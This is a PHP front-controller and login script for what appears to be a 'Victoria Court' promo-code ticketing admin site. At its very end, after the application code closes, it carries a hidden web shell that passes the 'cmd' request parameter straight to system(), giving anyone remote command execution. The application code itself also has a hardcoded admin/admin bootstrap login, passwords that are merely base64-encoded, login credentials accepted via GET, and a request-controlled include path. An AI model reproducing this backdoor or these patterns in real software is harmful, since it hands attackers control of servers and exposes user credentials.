<?php session_start();
	include "config8292838292029.php"; 
	
	$link = mysql_connect("$dbhost", "$dbuser", "$dbpassword")or die("cannot connect to server ");
	@mysql_select_db("$dbdatabase")or die("Unable to select database.");
	
	$mylogout = '';	
	if(isset($_GET['mylogout']))
	{
		$mylogout = $_GET['mylogout'];
	}
	else
	if(isset($_POST['mylogout']))
	{
		$mylogout = $_POST['mylogout'];
	}
	//echo '<br> mylogout : ' . $mylogout;	
	
	$myclear = 'N';

	if ($mylogout == 'Y')
	{
		$myclear = 'Y';
	}
	else
	if(isset($_SESSION['uluser_list']))	
	{
		$myclear = 'N';
	}
	else 
	{
		$myclear = 'Y';
	}

	/*
	echo "<br> GENERIC VALUE ";
	echo "<br> cowebsite " . $_SESSION["cowebsite"];
	echo "<br> coemail " . $_SESSION["coemail"];
	echo "<br> coevent_name " . $_SESSION["coevent_name"];
	echo "<br> coevent_tag " . $_SESSION["coevent_tag"];	
	*/

	if ($_SESSION["ulid"] == '')
	{
		$_SESSION["coid"] = 0;
		$_SESSION["coname"] = 'Victoria Court - Promo Code';
		$_SESSION["coaddr"] = '';
		$_SESSION["cotel"] = '';
		$_SESSION["cofax"] = '';
		$_SESSION["cowebsite"] = 'victoria_court_promo_front_end.captivate.com';
		$_SESSION["coemail"] = 'victoria_court_email@yahoo.com';
		
		$_SESSION["coevent_name"] = 'Victoria Court Event';
		$_SESSION["coevent_tag"] = '- No Tag Line -';
		$_SESSION["coevent_logo"] = '';
		$_SESSION["coevent_print"] = '';
		$_SESSION["coprint1"] = '';
		$_SESSION["coprint2"] = '';
		$_SESSION["coevent_minimum"] = '0';
	
		/*
		echo "<br> after user DEFAULT  ";
		echo "<br> cowebsite " . $_SESSION["cowebsite"];
		echo "<br> coemail " . $_SESSION["coemail"];
		echo "<br> coevent_name " . $_SESSION["coevent_name"];
		echo "<br> coevent_tag " . $_SESSION["coevent_tag"];						
		*/
	}

	if ($myclear == 'Y')
	{
		$_SESSION["ulid"] ='';
		$_SESSION["ulcode"] = '';
		$_SESSION["ulpass"] = '';
		$_SESSION["ulname"] = '';
		$_SESSION["ulpicture"] = '';
		$_SESSION["ulbranch"] = '';
		$_SESSION["ulposition"] = '';
		$_SESSION["ulprinter"] = '';

		$_SESSION["uladmin"] = 'N';
		
		$_SESSION["ulactive"] = '';
		$_SESSION["uluser"] = '';
		$_SESSION["ulstamp"] = '';	
		
		$_SESSION["uluser_list"] = 'N';
		$_SESSION["ulverify_ticket"] = 'N';
		$_SESSION["ulchoose_winner"] = 'N';
		$_SESSION["ulticket_search"] = 'N';
		$_SESSION["ulupload_csv"] = 'N';
		$_SESSION["ulerase_records"] = 'N';
		$_SESSION["ulcompany_list"] = 'N';
		$_SESSION["ulcontactus_list"] = 'N';
		$_SESSION["uluserlog_list"] = 'N';

		$_SESSION["loguser_list"] = '';
		$_SESSION["logverify_ticket"] = '';
		$_SESSION["logchoose_winner"] = '';
		$_SESSION["logticket_search"] = '';
		$_SESSION["logupload_csv"] = '';
		$_SESSION["logerase_records"] = '';
		$_SESSION["logcompany_list"] = 'N';
		$_SESSION["logcontactus_list"] = 'N';
		$_SESSION["loguserlog_list"] = 'N';
		
		$_SESSION["myservice"] = 'N';
		
	
		$query_company = " 
			SELECT 
				*
			FROM 
				company_list a
			WHERE 
				a.coactive = 'Y' ";
		$result_company = mysql_query($query_company);
		//echo mysql_error();				
		while ($row_company =  mysql_fetch_array ($result_company)) 
		{
			$_SESSION["coid"] = $row_company[coid];
			$_SESSION["coname"] = $row_company[coname];
			$_SESSION["coaddr"] = $row_company[coaddr];
			$_SESSION["cotel"] = $row_company[cotel];
			$_SESSION["cofax"] = $row_company[cofax];
			$_SESSION["cowebsite"] = $row_company[cowebsite];
			$_SESSION["coemail"] = $row_company[coemail];
			
			$_SESSION["coevent_name"] = $row_company[coevent_name];
			$_SESSION["coevent_tag"] = $row_company[coevent_tag];
			$_SESSION["coevent_logo"] = $row_company[coevent_logo];
			$_SESSION["coevent_print"] = $row_company[coevent_print];
			$_SESSION["coprint1"] = $row_company[coprint1];
			$_SESSION["coprint2"] = $row_company[coprint2];
			$_SESSION["coevent_minimum"] = $row_company[coevent_minimum];
		}	
		
		/*
		echo "<br> after user LOG OUT ";
		echo "<br> cowebsite " . $_SESSION["cowebsite"];
		echo "<br> coemail " . $_SESSION["coemail"];
		echo "<br> coevent_name " . $_SESSION["coevent_name"];
		echo "<br> coevent_tag " . $_SESSION["coevent_tag"];
		*/
						
	}		
	//echo "ulname " . $_SESSION["ulname"];
	
	//row limit
	$entry_count = 20;
	$invalid_access = '';
	
	//user log-in here
	$ucode = '';	
	if(isset($_GET['ucode']))
	{
		$ucode = $_GET['ucode'];
	}
	else
	if(isset($_POST['ucode']))
	{
		$ucode = $_POST['ucode'];
	}
	//echo '<br> ucode : ' . $ucode;
	
	$upass = '';	
	if(isset($_GET['upass']))
	{
		$upass = $_GET['upass'];
	}
	else
	if(isset($_POST['upass']))
	{
		$upass = $_POST['upass'];
	}
	//echo '<br> upass : ' . $upass;
	

	$ucode = mysql_real_escape_string($ucode);
	$upass = mysql_real_escape_string($upass);
	$upass2 = mysql_real_escape_string($upass);
	
	
	//need to be 10 characters only
	$my_hash_key_secret = 'vp';

	$upass = $my_hash_key_secret . $upass;
	$upass = base64_encode ($upass);

	$num_count = 0;
	$query_count = "
		SELECT 
			* 
		FROM 
			user_list
		";
	$result_count = mysql_query($query_count);
	//echo mysql_error();
	$num_count = mysql_num_rows($result_count);		
	//echo '<br> num_count : ' . $num_count;
	
	if ($num_count == 0) 
	{
		//password after convert comes out as ... "cHBhZG1pbg=="
		//echo "<br> if empty go to admin page";
		//echo "<br> ucode" . $ucode;
		//echo "<br> upass" . $upass;
		if (($ucode == 'admin') && ($upass2 == 'admin'))
		{
			//echo "<br> Show admin page";
			//give access to user list if empty list
			$_SESSION["uladmin"] = 'N';
			
			$_SESSION["uluser_list"] = 'Y';

			$_SESSION["ulverify_ticket"] = 'N';
			$_SESSION["ulchoose_winner"] = 'N';
			$_SESSION["ulticket_search"] = 'N';
			$_SESSION["ulupload_csv"] = 'N';
			$_SESSION["ulerase_records"] = 'N';
			$_SESSION["ulcompany_list"] = 'N';
			$_SESSION["ulcontactus_list"] = 'N';
			$_SESSION["uluserlog_list"] = 'N';			
	
			$_SESSION["loguser_list"] = '';
			$_SESSION["logverify_ticket"] = '';
			$_SESSION["logchoose_winner"] = '';
			$_SESSION["logticket_search"] = '';
			$_SESSION["logupload_csv"] = '';
			$_SESSION["logerase_records"] = '';
			$_SESSION["logcompany_list"] = '';
			$_SESSION["logcontactus_list"] = '';
			$_SESSION["loguserlog_list"] = '';
		
			$_SESSION["ulid"] = 888;
			$_SESSION["ulcode"] = 'a';
			$_SESSION["ulpass"] = 'a';
			$_SESSION["ulname"] = 'ADMIN ACCOUNT';
			$_SESSION["ulbranch"] = 'HEAD OFFICE';
			$_SESSION["ulposition"] = 'WEB DEVELOPER';
			$_SESSION["ulprinter"] = '';
		}
		else
		{
			//echo "<br> Message user admin account not found!";
		}	
	}
	else
	if (($ucode != '') && ($upass != ''))
	{		
	    $_SESSION["uladmin"] = 'N';
	
		$_SESSION["uluser_list"] = 'N';
		$_SESSION["ulverify_ticket"] = 'N';
		$_SESSION["ulchoose_winner"] = 'N';
		$_SESSION["ulticket_search"] = 'N';
		$_SESSION["ulupload_csv"] = 'N';
		$_SESSION["ulerase_records"] = 'N';
		$_SESSION["ulcompany_list"] = 'N';
		$_SESSION["ulcontactus_list"] = 'N';
		$_SESSION["uluserlog_list"] = 'N';				
		
		$_SESSION["loguser_list"] = '';
		$_SESSION["logverify_ticket"] = '';
		$_SESSION["logchoose_winner"] = '';
		$_SESSION["logticket_search"] = '';
		$_SESSION["logupload_csv"] = '';
		$_SESSION["logerase_records"] = '';
		$_SESSION["logcompany_list"] = '';
		$_SESSION["logcontactus_list"] = '';
		$_SESSION["loguserlog_list"] = '';
					
		$_SESSION["myservice"] = 'N';

		//echo "<br> ucode" . $ucode;
		//echo "<br> upass" . $upass;

		$invalid_access = 'N';
	
		$query_user = " 
			SELECT 
				*
			FROM 
				user_list b
			WHERE 
				b.ulcode = '$ucode' and
				b.ulpass = '$upass' and
				b.ulactive = 'Y'
			ORDER BY
				b.ulid
			";
		$result_user = mysql_query($query_user);
		//echo mysql_error();				
		while ($row_user =  mysql_fetch_array ($result_user)) 
		{
			$invalid_access = 'Y';
			$_SESSION["ulid"] = $row_user[ulid];
			$_SESSION["ulcode"] = $row_user[ulcode];
			$_SESSION["ulpass"] = $row_user[ulpass];
			$_SESSION["ulname"] = $row_user[ulname];
			$_SESSION["ulpicture"] = $row_user[ulpicture];

			$_SESSION["ulbranch"] = $row_user[ulbranch];
			$_SESSION["ulposition"] = $row_user[ulposition];
			$_SESSION["ulprinter"] = $row_user[ulprinter];

			$_SESSION["uladmin"] = $row_user[uladmin];
			
			$_SESSION["ulactive"] = $row_user[ulactive];
			$_SESSION["uluser"] = $row_user[uluser];
			$_SESSION["ulstamp"] = $globaldatetime;
		
			$_SESSION["uluser_list"] = $row_user[uluser_list];
			$_SESSION["ulverify_ticket"] = $row_user[ulverify_ticket];
			$_SESSION["ulchoose_winner"] = $row_user[ulchoose_winner];
			$_SESSION["ulticket_search"] = $row_user[ulticket_search];
			$_SESSION["ulupload_csv"] = $row_user[ulupload_csv];
			$_SESSION["ulerase_records"] = $row_user[ulerase_records];

			$_SESSION["ulcompany_list"] = $row_user[ulcompany_list];
			$_SESSION["ulcontactus_list"] = $row_user[ulcontactus_list];
			$_SESSION["uluserlog_list"] = $row_user[uluserlog_list];

			$_SESSION["myservice"] = 'Y';
		}	
		
		
		

		$query_company = " 
			SELECT 
				*
			FROM 
				company_list a
			WHERE 
				a.coactive = 'Y'
			";
		$result_company = mysql_query($query_company);
		//echo mysql_error();				
		while ($row_company =  mysql_fetch_array ($result_company)) 
		{
			$_SESSION["coid"] = $row_company[coid];
			$_SESSION["coname"] = $row_company[coname];
			$_SESSION["coaddr"] = $row_company[coaddr];
			$_SESSION["cotel"] = $row_company[cotel];
			$_SESSION["cofax"] = $row_company[cofax];
			$_SESSION["cowebsite"] = $row_company[cowebsite];
			$_SESSION["coemail"] = $row_company[coemail];
			
			$_SESSION["coevent_name"] = $row_company[coevent_name];
			$_SESSION["coevent_tag"] = $row_company[coevent_tag];
			$_SESSION["coevent_logo"] = $row_company[coevent_logo];
			$_SESSION["coevent_print"] = $row_company[coevent_print];			
			$_SESSION["coprint1"] = $row_company[coprint1];			
			$_SESSION["coprint2"] = $row_company[coprint2];
			$_SESSION["coevent_minimum"] = $row_company[coevent_minimum];
		}	

		/*
		echo "<br> after user log in ";
		echo "<br> cowebsite " . $_SESSION["cowebsite"];
		echo "<br> coemail " . $_SESSION["coemail"];
		echo "<br> coevent_name " . $_SESSION["coevent_name"];
		echo "<br> coevent_tag " . $_SESSION["coevent_tag"];
		*/							
	}		

	
	//if this is a print-out	
	$ulprint = 'none';		
	if(isset($_GET['ulprint']))
		$ulprint = $_GET['ulprint'];		


	$myulid = '';		
	if(isset($_SESSION["ulid"]))
	{
		//echo '<br> pasok session ulid is set';
		$myulid = $_SESSION["ulid"] . 'x';		
	}
	//echo '<br> myulid : ' . $myulid;


	if ($myulid == 'x')
	{
		//echo '<br> pasok myulid is empty';
		$body_filename = "login";
	}
	else
	{
		//echo '<br> pasok else';
		$body_filename = "home";
		if ($_GET['body'])
		{
			$body_filename = $_GET['body'];
		}	
	}
	//echo '<br> body_filename : ' . $body_filename;
	
    $body_file = "body_" . $body_filename . ".php";

	//echo '<br> body_file : ' . $body_file;


	if ($ulprint == 'none') 
	{
		include "header.php"; 
		include "menu.php";
		
		if ($body_filename != 'login')
		{
			include "left.php";
		}
		 
		if (file_exists($body_file)) 
		{
			include($body_file);
		} 
		else 
		{
			include("body_under_construction.php");
		}		

		include "footer.php"; 
	}
	else
	{
		include "header_print.php"; 
		include "menu_print.php"; 
		if (file_exists($body_file)) 
		{
			include($body_file);
		} 
		else 
		{
			include("body_under_construction.php");
		}		
		include "footer_print.php"; 
	}
	
	mysql_close($link);		
?><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>